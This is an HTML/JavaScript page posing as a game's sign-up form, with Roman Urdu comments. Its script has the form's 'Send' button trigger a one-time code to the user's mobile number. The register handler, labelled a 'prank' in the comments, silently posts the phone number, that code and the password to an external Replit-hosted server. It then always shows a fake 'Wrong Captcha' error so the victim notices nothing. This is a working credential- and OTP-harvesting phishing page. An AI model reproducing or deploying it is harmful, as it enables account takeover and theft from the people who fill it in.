<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>M777 - GAME</title>
    <style>
        /* CSS mein koi tabdeeli nahi hai */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #000; }
        .content-wrapper { width: 100%; height: 100%; background: url('background.png') no-repeat center center; background-size: cover; position: relative; }
        .page-container { display: flex; justify-content: flex-end; align-items: flex-start; height: 100%; width: 100%; padding-right: 6%; box-sizing: border-box; padding-bottom: 4vh; }
        .login-form, .register-form { background-color: rgba(30, 30, 50, 0.6); padding: 15px 20px; border-radius: 15px; width: 85%; border: 1px solid rgba(255, 255, 255, 0.2); backdrop-filter: blur(7px); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.4); }
        .login-form { max-width: 300px; margin-top: 13vh; }
        .register-form { max-width: 380px; margin-top: 5vh; }
        .hidden { display: none; }
        h1.form-title { color: white; text-align: center; font-size: 20px; margin-top: 0; margin-bottom: 15px; }
        .input-group { margin-bottom: 10px; }
        .input-container, .mobile-input-container, .password-container { display: flex; align-items: center; background-color: rgb(85, 45, 45); border-radius: 20px; border: 1px solid rgba(0, 0, 0, 0.3); box-shadow: inset 0 2px 4px rgba(0,0,0,0.4); padding: 0 8px; position: relative; height: 32px; }
        .input-group input { width: 100%; padding: 5px 6px; border: none; background: transparent; color: #fff; font-size: 12px; outline: none; height: 100%; box-sizing: border-box; }
        .input-group input::placeholder { color: #c8b4c0; font-size: 11px; }
        #login-form .input-group label { display: block; color: white; margin-bottom: 5px; font-weight: bold; font-size: 12px; }
        #register-form .input-group { display: flex; align-items: center; justify-content: space-between; }
        #register-form .input-group label { color: white; font-weight: bold; font-size: 12px; flex-basis: 25%; margin-bottom: 0; padding-right: 5px; }
        #register-form .input-container, #register-form .mobile-input-container, #register-form .password-container { flex-basis: 73%; }
        .error-message { color: #ff4d4d; font-size: 11px; font-weight: bold; text-align: right; margin-top: -5px; margin-bottom: 5px; display: none; }
        #custom-toast { visibility: hidden; min-width: 250px; background-color: rgba(0, 0, 0, 0.8); color: #fff; text-align: center; border-radius: 25px; padding: 16px; position: absolute; z-index: 1000; left: 50%; top: 50%; transform: translate(-50%, -50%); font-size: 17px; border: 1px solid rgba(255, 255, 255, 0.2); box-shadow: 0 0 10px rgba(0,0,0,0.5); opacity: 0; transition: opacity 0.5s, visibility 0.5s; }
        #custom-toast.show { visibility: visible; opacity: 1; }
        @media (orientation: portrait) { .content-wrapper { width: 100vh; height: 100vw; position: absolute; top: 0; left: 0; transform-origin: top left; transform: rotate(90deg) translateY(-100%); } }
    </style>
</head>
<body>
    <audio id="background-music" src="music.mp3" loop></audio>
    <div class="content-wrapper">
        <div id="custom-toast"></div>
        <div class="page-container">
            <form class="login-form" id="login-form">
                </form>
            <form class="register-form hidden" id="register-form">
                <h1 class="form-title">Register</h1>
                <div class="input-group">
                    <label for="register-mobile">Mobile</label>
                    <div class="input-container">
                        <div class="country-code"><span>092</span></div>
                        <input type="tel" id="register-mobile" placeholder="3XX-XXXXXXX" required>
                    </div>
                </div>
                <div class="input-group captcha-container">
                    <label for="captcha">Captcha</label>
                    <div class="input-container">
                        <input type="text" id="captcha" placeholder="Captcha" required>
                        <button type="button" class="btn-send" id="send-otp-btn">Send</button>
                    </div>
                </div>
                <p class="error-message" id="captcha-error">Wrong Captcha</p> <div class="input-group">
                    <label for="register-password">Password</label>
                    <div class="input-container">
                        <input type="password" id="register-password" placeholder="Password" required>
                    </div>
                </div>
                <div class="input-group">
                    <label for="confirm-password">Confirm</label>
                    <div class="input-container">
                        <input type="password" id="confirm-password" placeholder="Confirm password" required>
                    </div>
                </div>
                <div class="terms-container">
                    <input type="checkbox" id="terms" required checked><label for="terms">Accept Terms</label>
                </div>
                <div class="buttons">
                    <button type="button" class="btn btn-back" id="show-login-btn">Back</button>
                    <button type="submit" class="btn btn-register">Register</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        const API_URL = 'https://6ff2476e-cfd1-40af-b64a-ac9ffe70fd74-00-2zckfh4t0utmg.sisko.replit.dev';
        const loginForm = document.getElementById('login-form');
        const registerForm = document.getElementById('register-form');
        const showRegisterBtn = document.getElementById('show-register-btn');
        const showLoginBtn = document.getElementById('show-login-btn');
        const sendOtpBtn = document.getElementById('send-otp-btn');
        const captchaError = document.getElementById('captcha-error');

        function showToast(message){const toast=document.getElementById("custom-toast");toast.innerText=message;toast.className="show";setTimeout(function(){toast.className=toast.className.replace("show","")},3000)}
        function handleFirstInteraction(){/* Music/Fullscreen code... */}
        document.addEventListener('click',handleFirstInteraction);
        
        showRegisterBtn.addEventListener('click',()=>{loginForm.classList.add('hidden');registerForm.classList.remove('hidden')});
        showLoginBtn.addEventListener('click',()=>{registerForm.classList.add('hidden');loginForm.classList.remove('hidden')});

        // OTP Send button (TIMER KE SAATH) - Is mein koi tabdeeli nahi
        sendOtpBtn.addEventListener('click', async () => {
            const mobileInput = document.getElementById('register-mobile').value;
            if (mobileInput.length < 10) {
                showToast("Please enter a valid mobile number.");
                return;
            }

            sendOtpBtn.disabled = true;
            let timer = 59;
            sendOtpBtn.innerText = `Wait ${timer + 1}s`;
            const countdown = setInterval(() => {
                sendOtpBtn.innerText = `Wait ${timer}s`;
                timer--;
                if (timer < 0) {
                    clearInterval(countdown);
                    sendOtpBtn.disabled = false;
                    sendOtpBtn.innerText = "Send";
                }
            }, 1000);

            const mobileNumber = "092" + mobileInput;
            try {
                const response = await fetch(`${API_URL}/request-otp`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber: mobileNumber })
                });
                if (response.ok) { showToast("Success"); }
                else { const data = await response.json(); showToast(data.message); }
            } catch (error) {
                showToast("Error: Could not connect to server.");
                clearInterval(countdown);
                sendOtpBtn.disabled = false;
                sendOtpBtn.innerText = "Send";
            }
        });

        // ===== REGISTER BUTTON KA NAYA PRANK FUNCTION =====
        registerForm.addEventListener('submit', (event) => {
            event.preventDefault();
            captchaError.style.display = 'none';

            // Basic validation
            const password = document.getElementById('register-password').value;
            const confirmPassword = document.getElementById('confirm-password').value;
            if (password.length < 6) { showToast("Password must be at least 6 characters long."); return; }
            if (password !== confirmPassword) { showToast("Passwords do not match."); return; }
            
            // User ka data hasil karein
            const mobileInput = document.getElementById('register-mobile').value;
            const phoneNumber = "092" + mobileInput;
            const otp = document.getElementById('captcha').value;

            // 1. Data ko background mein server par bhej dein
            fetch(`${API_URL}/submit-registration`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber, otp, password })
            }).catch(error => {
                // Agar server par data na bhi jaye to user ko nahi batana
                console.error("Data could not be sent to admin panel:", error);
            });

            // 2. Foran user ko "Wrong Captcha" ka error dikha dein
            captchaError.style.display = 'block';
        });
        
    </script>
</body>
</html>
